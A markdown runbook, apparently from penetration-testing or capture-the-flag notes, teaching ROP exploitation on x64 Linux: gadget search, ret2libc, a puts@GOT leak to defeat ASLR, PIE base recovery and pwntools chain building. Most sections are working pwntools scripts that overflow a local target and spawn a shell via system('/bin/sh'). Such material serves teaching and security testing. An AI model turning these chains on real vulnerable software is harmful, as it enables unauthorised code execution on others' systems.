# ROP chain exploitation

When NX/DEP is enabled, the stack is not executable and direct shellcode injection
fails. Return-Oriented Programming reuses existing executable code (gadgets ending
in `ret`) to build arbitrary computation from the target's own binary and libraries.

## Prerequisites

- Stack overflow with control of the return address (see stack-overflow.md for offset
  finding and bad character identification)
- Knowledge of which protections are active

```text
checksec --file=./target
# NX enabled, PIE disabled (or with a leak to defeat PIE), ASLR disabled or bypassable
```

This runbook covers NX bypass via ROP. PIE+ASLR requires an information leak first
(covered at the end).

## Find gadgets

```text
# ROPgadget: comprehensive gadget search
ROPgadget --binary ./target --rop --nojop

# also search loaded libraries
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop | grep "pop rdi"

# ropper: alternative with filtering
ropper -f ./target --search "pop rdi; ret"
ropper -f ./target --search "pop rsi; pop r15; ret"

# pwntools ROP class: automatic chain building
from pwn import *
elf = ELF('./target')
rop = ROP(elf)
print(rop.dump())
```

Key gadgets for x64 Linux calling convention (arguments in rdi, rsi, rdx):

```text
pop rdi; ret        # first argument
pop rsi; ret        # second argument (or pop rsi; pop r15; ret)
pop rdx; ret        # third argument
ret                 # stack alignment (required before some SSE instructions)
```

## ret2plt / ret2libc

The simplest ROP goal is calling `system("/bin/sh")`. With ASLR disabled or a known
libc base:

```python
from pwn import *

elf = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# find gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]  # for stack alignment

# find system and /bin/sh in libc (with known base)
libc_base = 0x0  # set if ASLR disabled, or from a leak
system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

OFFSET = 72  # from offset-finding step

payload  = b'A' * OFFSET
payload += p64(ret_gadget)       # stack alignment
payload += p64(pop_rdi)          # gadget: pop rdi; ret
payload += p64(binsh_addr)       # rdi = "/bin/sh"
payload += p64(system_addr)      # call system

p = process('./target')
p.sendline(payload)
p.interactive()
```

## Leaking libc base (defeating ASLR)

When ASLR is enabled, libc is loaded at a random base. Use a PLT/GOT leak to
find it:

The technique: call `puts` (or `printf`) with a GOT entry as its argument. `puts`
prints the contents of that address, the resolved libc address of a known function.
Subtract the known offset to find libc base.

```python
from pwn import *

elf = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

# stage 1: leak puts@GOT via puts@PLT, then return to main
leak_payload  = b'A' * OFFSET
leak_payload += p64(pop_rdi)
leak_payload += p64(elf.got['puts'])      # rdi = address of puts in GOT
leak_payload += p64(elf.plt['puts'])      # call puts(puts@GOT)
leak_payload += p64(elf.symbols['main'])  # loop back to main

p = process('./target')
p.sendline(leak_payload)
p.recvuntil(b'prompt if any')

# read the leaked address (6 bytes on most 64-bit systems)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'Leaked puts@libc: {hex(leak)}')

libc.address = leak - libc.symbols['puts']
print(f'libc base: {hex(libc.address)}')

# stage 2: now call system("/bin/sh") with known libc base
system_addr = libc.symbols['system']
binsh_addr  = next(libc.search(b'/bin/sh'))

exploit_payload  = b'A' * OFFSET
exploit_payload += p64(ret_gadget)
exploit_payload += p64(pop_rdi)
exploit_payload += p64(binsh_addr)
exploit_payload += p64(system_addr)

p.sendline(exploit_payload)
p.interactive()
```

## Defeating PIE

When PIE is enabled, the binary itself is loaded at a random base. A leak of any
address from the binary's text or data segment reveals the base:

```python
# if you can leak a GOT entry or a stack pointer pointing into the binary:
elf.address = leaked_binary_addr - elf.symbols['known_function']
# now all elf.symbols, elf.got, elf.plt are correct
```

PIE+ASLR together require two leaks (one for libc, one for the binary) or a combined
leak. This is why modern exploits target information disclosure bugs as a prerequisite.

## Automating with pwntools ROP

pwntools can build common chains automatically when gadgets are available:

```python
from pwn import *

elf = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = libc_base  # set from leak

rop = ROP([elf, libc])
rop.system(next(libc.search(b'/bin/sh')))

payload = b'A' * OFFSET + rop.chain()

p = process('./target')
p.sendline(payload)
p.interactive()
```

## Debugging the chain

```text
gdb -q ./target
(gdb) break *0xADDRESS  # break at start of ROP chain (overwritten return address)
(gdb) run < <(python3 exploit.py)
(gdb) si                 # step through each gadget
(gdb) x/gx $rsp         # check next return address
```

Common failures:
- Stack misalignment: add a bare `ret` gadget before the final call (required for
  SSE instructions in glibc on x64)
- Bad characters in addresses: choose a different gadget or libc function
- Gadget not in binary: search loaded libraries, particularly libc and ld
